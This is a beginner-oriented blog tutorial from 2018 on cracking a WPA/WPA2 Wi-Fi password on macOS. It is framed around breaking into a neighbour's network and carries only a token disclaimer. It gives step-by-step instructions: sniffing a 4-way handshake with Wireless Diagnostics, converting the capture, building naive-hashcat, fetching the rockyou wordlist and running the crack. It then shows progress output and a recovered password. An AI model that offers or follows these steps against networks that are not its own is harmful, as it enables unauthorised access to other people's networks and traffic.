---
title: Crack Wifi Passwords the Easy Way! (OSX Version)
---

# {% $markdoc.frontmatter.title %}

**14th June 2018**

> DISCLAIMER: This article is for educational purposes only. This article should not be used for illegal activity. The author is not responsible for its use.

You are 18 and bored at your grandma's place, there is no source of entertainment, but you find out there is a sweet wifi spot at your neighbours. You have gone through a lot of wifi cracking articles/videos but the more you try, the more frustrated you get to have it working correctly. I feel ya! Here's where this article comes in handy.

Even though majority classify cracking wifi passwords for the professional's, but this article is also targeted towards beginners who have very little knowledge on computers. So, feel free to give it a shot!

## Prerequisites

- You need to be familiar with the command line. Or at least, how to paste the commands on the terminal ;)
- You are using a Mac (or running OSX)

## My Setup

I am using a MacBook Pro (13-inch, 2017) running macOS High Sierra version 10.13.5. You can find yours by selecting the `Apple` icon on the menu bar (top left of your screen) and select `About This Mac`.

## Preparing your work directory

Lets create a folder on Desktop where we want to place all our work files in. You can change to your desired directory if needed.

Open the terminal (`Command` + `Space` and type `Terminal`). Once open, run the following commands

```bash
# Make your work directory
$ cd ~/Desktop
$ mkdir my-wifi-cracking-work
$ cd my-wifi-cracking-work
```
The `my-wifi-cracking-work` folder is now visible on your desktop screen.

## Lets Get Started!

Here's how we plan to accomplish it:
- We first identifying the target network to crack
- Attempt to capture a 4 way handshake with our target network
- Finally, crack the network password!

### Identifying the the target network

Luckily OSX comes with wireless diagnostic tools that help with scanning/sniffing/etc. To access it, click on the wifi icon on the the menu bar while holding down the option key.

[![picture-1.png](https://svbtleusercontent.com/3yiKyudn4HrFpNqezgtrk90xspap_small.png)](https://svbtleusercontent.com/3yiKyudn4HrFpNqezgtrk90xspap.png)

A dropdown menu will appear. Click on `Open Wireless Diagnostics ...`.

`Wireless Diagnostics` window appears now, but we will not use the one shown. Click on `Window` on the menu bar and select `Scan`.

[![picture-2.png](https://svbtleusercontent.com/f6a1X6XGXhh2sQeCHTyqgb0xspap_small.png)](https://svbtleusercontent.com/f6a1X6XGXhh2sQeCHTyqgb0xspap.png)

Note down the target networks `channel` and `width`.

Here's an example of my target network:

```
Target Network - jahid
Channel - 4
Width - 40 MHz
```

### Capturing 4-way handshake with your target network

With the `Wireless Diagnostics` window open, click on `Window` on the menu bar and select `Sniffer`. Here, select the channel and width found from the previous step and press `Start`. The tool automatically tries to capture a handshake with the desired network, no prompt will be shown though.

Wait for 2-3 mins (we assume that is the typical time for a handshake to occur) and then press `Stop`.

On pressing `Stop`, the `pcap` file will be created on `/var/tmp` folder.

Lets now move this file into our work folder.

```bash
# Lets note down the file that was created
$ ls -l /var/tmp

# Identify the pcap file that was created by checking the date and time of each file. For example, in my case, the file created is (null)_ch04_2018-06-14_17.30.13.pcap
$ cp /var/tmp/(null)_ch04_2018-06-14_17.30.13.pcap ~/Desktop/my-wifi-cracking-work/
```
We need to convert the `.pcap` file to `.hccapx` file by uploading it [here](https://hashcat.net/cap2hccapx/). If the handshake was captured in the file, this start the download of the `.hccapx` file. If not, you will need to try a bit longer than earlier stated to generate this file.

## Cracking the password

[Download](https://github.com/brannondorsey/naive-hashcat/archive/master.zip) `naive-hashcat` and extract into the work directory.

OR

`git clone` it.
```bash
$ git clone https://github.com/brannondorsey/naive-hashcat.git ~/Desktop/my-wifi-cracking-work/
```

Then ...
```bash
$ cd naive-hashcat

# Let the source files build
$ ./build-hashcat-osx.sh

# download the 134MB rockyou dictionary file
$ curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Copy the .hccapx file downloaded previously cloned folder
$ cp ~/Downloads/<your file>.hccapx ~/Desktop/my-wifi-cracking-work/naive-hashcat/

# Start cracking ..
$ HASH_FILE=<your file>.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh
```
The cracking will take sometime depending on your hardware. To check your progress, you can press `s` where it would display an output similar to this:

```
Session..........: hashcat
Status...........: Running
Hash.Type........: WPA/WPA2
Hash.Target......: jahid (AP:00:b0:c6:63:63:11 STA:34:8a:7b:8b:96:d0)
Time.Started.....: Fri Jun 15 23:34:49 2018 (3 secs)
Time.Estimated...: Fri Jun 15 23:54:29 2018 (19 mins, 37 secs)
Guess.Base.......: File (dicts/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....:    12058 H/s (7.43ms) @ Accel:8 Loops:4 Thr:256 Vec:1
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 145930/14344384 (1.02%)
Rejected.........: 145930/145930 (100.00%)
Restore.Point....: 0/14344384 (0.00%)
Candidates.#2....: 123456789 -> getpaid1
```

Once done, the results will be storied in `cracked.pot` file. It will be in a format will be network name and password seperated by `:`
```
e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:jahid:veryhardpassword123
```
In this case the password is `veryhardpassword123`.

## Attribution
> This article was inspired by the work of [@brannondorsey](https://github.com/brannondorsey) and [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). [Source](https://github.com/brannondorsey/wifi-cracking).